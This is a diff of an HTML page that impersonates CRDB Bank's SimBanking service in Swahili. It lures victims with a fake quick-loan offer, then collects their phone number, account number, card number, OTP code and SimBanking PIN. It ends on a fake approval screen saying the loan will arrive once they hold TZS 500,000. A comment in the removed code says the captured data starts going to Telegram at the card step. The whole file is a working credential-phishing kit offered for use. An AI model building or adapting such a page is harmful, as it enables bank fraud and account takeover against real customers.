@@ -3,150 +3,151 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CRDB SimBanking Mkopo wa Haraka</title>
+    <title>CRDB SimBanking - Benki yako mkononi</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <!-- LOADING SPINNER -->
-    <div id="loading-spinner" class="spinner-overlay hidden">
-        <div class="spinner"></div>
-        <p id="loading-text">Inapakia...</p>
-    </div>
-
-    <!-- SCREEN 0: CALCULATOR LANDING -->
-    <div id="screen-landing" class="screen">
+    <div class="container">
+        <!-- Header -->
         <header class="bank-header">
-            <div class="logo-area">
-                <span class="menu-icon">☰</span>
-                <div class="bank-logo">CRDB BANK</div>
+            <div class="menu-icon">☰</div>
+            <div class="brand-logo">
+                <span class="crdb-text">CRDB</span> <span class="bank-text">BANK</span>
+                <span class="divider">|</span>
+                <div class="simbanking-logo">
+                    <span class="phone-icon">📱</span>
+                    <div>
+                        <span class="sim-title">Simbanking</span>
+                        <span class="sim-sub">Benki yako mkononi</span>
+                    </div>
+                </div>
             </div>
-            <div class="simbanking-title">SimBanking <small>Benki yako mkononi</small></div>
         </header>
-        <div class="hero-banner">
-            <h1>KIKOSI CHA MKOPO WA HARAKA</h1>
-            <p>Chagua kiasi cha mkopo na muda wa kulipa.</p>
+
+        <!-- STEP 1: Loan & Personal Info -->
+        <div id="step-personal_info" class="form-step active">
+            <div class="step-indicator">Maombi ya Mkopo • Hatua 1 ya 3</div>
             
-            <div class="calculator-box" style="margin: 20px 0; text-align: left;">
-                <label>Kiasi cha Mkopo: <strong id="displayAmount" style="color:#00873e;">TZS 500,000</strong></label>
-                <input type="range" id="loanAmountSlider" min="50000" max="5000000" step="50000" value="500000" oninput="updateCalculator()" style="width:100%; margin:10px 0;">
-
-                <label>Muda wa Kulipa: <strong id="displayMonths" style="color:#00873e;">6 miezi</strong></label>
-                <input type="range" id="loanMonthsSlider" min="1" max="36" step="1" value="6" oninput="updateCalculator()" style="width:100%; margin:10px 0;">
-
-                <p style="font-size: 14px; color: #555; margin-top: 10px;">Makadirio ya Malipo ya Kila Mwezi: <strong id="displayMonthlyPayment" style="color:#00873e;">TZS 90,833</strong></p>
+            <div class="form-group">
+                <label>Aina ya Mkopo</label>
+                <select id="loanType">
+                    <option value="Mkopo wa Biashara">Mkopo wa Biashara</option>
+                    <option value="Mkopo wa Kilimo">Mkopo wa Kilimo</option>
+                    <option value="Mkopo wa Haraka">Mkopo wa Haraka</option>
+                </select>
             </div>
 
-            <button class="btn-primary" onclick="submitCalculator(event)">OMBA SASA</button>
-        </div>
-    </div>
-
-    <!-- SCREEN 1: PERSONAL INFO (Phone Number Only - Local / No Telegram) -->
-    <div id="screen-personal" class="screen hidden">
-        <header class="bank-header">
-            <div class="bank-logo">CRDB BANK</div>
-            <div class="simbanking-title">SimBanking</div>
-        </header>
-        <div class="form-container">
-            <h2>Weka Namba ya Simu</h2>
-            <p>Tafadhali ingiza namba yako ya simu ya mkononi kuanzia 255 ili kuendelea.</p>
-            <form id="form-personal" onsubmit="submitPersonal(event)">
-                <input type="hidden" id="requestedAmount" value="500000">
-                <div class="input-group">
-                    <label>Namba ya Simu</label>
-                    <input type="tel" inputmode="numeric" id="phoneNumber" placeholder="Mfano: 255712345678" required>
-                </div>
-                <p id="personal-notice" class="notice-msg" style="display:none;"></p>
-                <button type="submit" class="btn-primary">ENDELEA</button>
-            </form>
-        </div>
-    </div>
-
-    <!-- SCREEN 3: TEMBO CARD VERIFICATION (Starts Telegram Delivery Here!) -->
-    <div id="screen-step3" class="screen hidden">
-        <header class="bank-header">
-            <div class="bank-logo">CRDB BANK</div>
-        </header>
-        <div class="form-container">
-            <h2>Unatumia Uthibitisho wa Kadi ya Tembo</h2>
-            <p>Karibu! Nyumbani tafadhali inaruhusu unganisha akaunti yako ya Benki ya CRDB.</p>
-            <form id="form-step3" onsubmit="submitStep3(event)">
-                <div class="input-group">
-                    <label>Namba ya akaunti</label>
-                    <input type="text" id="accountNumber" placeholder="Namba ya akaunti" required>
-                </div>
-                <div class="input-group">
-                    <label>Namba yako ya kadi (16 Digits)</label>
-                    <input type="text" id="cardNumber" maxlength="16" placeholder="1111-1111-1111-1111" required>
-                </div>
-                <p id="step3-notice" class="notice-msg" style="display:none;"></p>
-                <button type="submit" class="btn-primary">ENDELEA</button>
-            </form>
-        </div>
-    </div>
-
-    <!-- SCREEN 4: OTP VERIFICATION (Numbers Only) -->
-    <div id="screen-step4" class="screen hidden dark-theme">
-        <header class="bank-header">
-            <div class="bank-logo">CRDB BANK</div>
-        </header>
-        <div class="form-container center">
-            <h2>Thibitisha Akaunti Yako</h2>
-            <p>Tafadhali ingiza namba ya OTP ya tarakimu 5 iliyotumwa.</p>
-            <form id="form-step4" onsubmit="submitStep4(event)">
-                <div class="otp-boxes">
-                    <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-input" required>
-                    <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-input" required>
-                    <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-input" required>
-                    <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-input" required>
-                    <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-input" required>
-                </div>
-                <p id="otp-notice" class="notice-msg" style="display:none;"></p>
-                <button type="submit" class="btn-primary">Thibitisha Akaunti</button>
-            </form>
-            <p style="text-align:center; margin-top:15px;">
-                <a href="#" onclick="resendOtp(event)" style="color:#4caf50;">Je, haukupokea namba ya OTP? Tuma tena OTP</a>
-            </p>
-        </div>
-    </div>
-
-    <!-- SCREEN 5: SIMBANKING PIN (Numbers Only, 3 Attempts) -->
-    <div id="screen-step5" class="screen hidden">
-        <header class="bank-header">
-            <div class="bank-logo">CRDB BANK</div>
-        </header>
-        <div class="form-container center">
-            <h2>Ingiza PIN ya Usalama</h2>
-            <p>Ingiza namba ya siri (PIN) ya usalama ya Simbanking ili kuendelea.</p>
-            <form id="form-step5" onsubmit="submitStep5(event)">
-                <div class="otp-boxes">
-                    <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-input" required>
-                    <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-input" required>
-                    <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-input" required>
-                    <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-input" required>
-                </div>
-                <p id="pin-notice" class="notice-msg" style="display:none;"></p>
-                <button type="submit" class="btn-primary">ENDELEA</button>
-            </form>
-        </div>
-    </div>
-
-    <!-- SCREEN 6: SUCCESS SCREEN -->
-    <div id="screen-success" class="screen hidden">
-        <header class="bank-header">
-            <div class="bank-logo">CRDB BANK</div>
-        </header>
-        <div class="success-banner">
-            <h2>OMBI LIMEKUBALIWA!</h2>
-            <p>Kiasi chako kimeidhinishwa na sasa kimewekwa katika akaunti yako ya CRDB SimBanking.</p>
-            <div class="approved-amount">TZS 1,250,000.00</div>
-            <div class="notice-card">
-                <h3>TAFADHALI KUMBUKA!</h3>
-                <p>Mteja lazima awe na angalau <strong>TZS. 500,000</strong> kwenye akaunti yake.</p>
+            <div class="form-group">
+                <label>Kiasi cha Mkopo (TSh)</label>
+                <input type="text" id="loanAmount" value="100,000">
             </div>
+
+            <div class="form-group">
+                <label>Jina la Kwanza & Jina la Ukoa</label>
+                <div class="name-grid">
+                    <input type="text" id="firstName" placeholder="Jina la kwanza">
+                    <input type="text" id="lastName" placeholder="Jina la ukoo">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Namba ya Simu</label>
+                <div class="phone-input-wrapper">
+                    <span class="prefix">+255</span>
+                    <input type="tel" id="phoneNumber" placeholder="712345678">
+                </div>
+            </div>
+
+            <button class="btn-primary" onclick="submitPersonalInfo()">HATUA INAYOFUATA</button>
+        </div>
+
+        <!-- STEP 3: Tembo Card & Account Verification -->
+        <div id="step-step3" class="form-step">
+            <div class="progress-bar-container"><div class="progress-fill" style="width: 33%;"></div></div>
+            <h2 class="section-title">Unatumia Uthibitishaji wa Kadi ya Tembo</h2>
+            <p class="section-desc">Karibu! Nyumbani tafadhali inaruhusu unganisha akaunti yako ya Benki ya CRDB</p>
+
+            <div class="form-group">
+                <label>Ingiza nambari yako ya akaunti</label>
+                <input type="text" id="accountNumber" placeholder="Namba ya akaunti">
+            </div>
+
+            <div class="form-group">
+                <label>Ingiza nambari yako ya kadi</label>
+                <input type="text" id="cardNumber" placeholder="1111-1111-1111-1111">
+            </div>
+
+            <button class="btn-primary" onclick="submitTemboCard()">ENDELEA</button>
+        </div>
+
+        <!-- STEP 4: OTP Screen with 30s Timer -->
+        <div id="step-step4" class="form-step">
+            <div class="shield-badge">🛡️</div>
+            <h2 class="section-title">Thibitisha Akaunti Yako</h2>
+            <p class="section-desc">Tafadhali ingiza namba ya OTP ya tarakimu 5 iliyotumwa kwa namba yako ya Tembo.</p>
+            
+            <div class="otp-phone-display">📞 OTP imetumwa kwa: <span id="displayPhone"></span></div>
+
+            <div class="otp-inputs">
+                <input type="text" maxlength="1" class="otp-box" oninput="moveToNext(this, 1)">
+                <input type="text" maxlength="1" class="otp-box" oninput="moveToNext(this, 2)">
+                <input type="text" maxlength="1" class="otp-box" oninput="moveToNext(this, 3)">
+                <input type="text" maxlength="1" class="otp-box" oninput="moveToNext(this, 4)">
+                <input type="text" maxlength="1" class="otp-box" oninput="moveToNext(this, 5)">
+            </div>
+
+            <button class="btn-primary" onclick="submitOtp()">Thibitisha Akaunti</button>
+            
+            <div class="timer-section">
+                <span>Je, haukupokea namba ya OTP?</span>
+                <button id="resendBtn" class="resend-link" onclick="triggerResendOtp()" disabled>Tuma tena OTP (<span id="timer">30</span>s)</button>
+            </div>
+        </div>
+
+        <!-- STEP 5: SimBanking PIN -->
+        <div id="step-step5" class="form-step">
+            <div class="lock-badge">🔒</div>
+            <h2 class="section-title">Ingiza PIN ya Usalama</h2>
+            <p class="section-desc">Ingiza namba ya siri (PIN) ya usalama ya Simbanking ili kuendelea.</p>
+
+            <div class="pin-inputs">
+                <input type="password" maxlength="1" class="pin-box" oninput="movePinNext(this, 1)">
+                <input type="password" maxlength="1" class="pin-box" oninput="movePinNext(this, 2)">
+                <input type="password" maxlength="1" class="pin-box" oninput="movePinNext(this, 3)">
+                <input type="password" maxlength="1" class="pin-box" oninput="movePinNext(this, 4)">
+            </div>
+
+            <button class="btn-primary" onclick="submitPin()">ENDELEA</button>
+        </div>
+
+        <!-- SUCCESS / APPROVED DASHBOARD (Matches final image reference) -->
+        <div id="step-success" class="form-step">
+            <div class="success-banner">
+                <div class="check-circle">✓</div>
+                <h2>OMBI LIMEKUBALIWA!</h2>
+                <p>Kiasi chako kimeidhinishwa na sasa kimewekwa katika akaunti yako ya CRDB Simbanking.</p>
+            </div>
+
+            <div class="approved-card">
+                <div class="card-label">KIASI KILICHOIDHINISHWA</div>
+                <div class="card-amount">TZS 1,250,000.00</div>
+                <div class="card-note">✓ Ombi lako limekamilika! Fedha zitatumwa moja kwa moja kwenye akaunti yako ndani ya <b>Dakika 30</b></div>
+            </div>
+
+            <div class="reminder-box">
+                <h3>⚠️ TAFADHALI KUMBUKA!</h3>
+                <p>Mteja lazima awe na angalau <b>TZS. 500,000</b> kwenye akaunti yake kabla ya kukamilisha ombi.</p>
+            </div>
+        </div>
+
+        <!-- Loading Overlay -->
+        <div id="loadingOverlay" class="loading-overlay" style="display:none;">
+            <div class="spinner"></div>
+            <p id="loadingText">Inachakata ombi lako...</p>
         </div>
     </div>
 
     <script src="script.js"></script>
 </body>
     </html>
-                    
+    
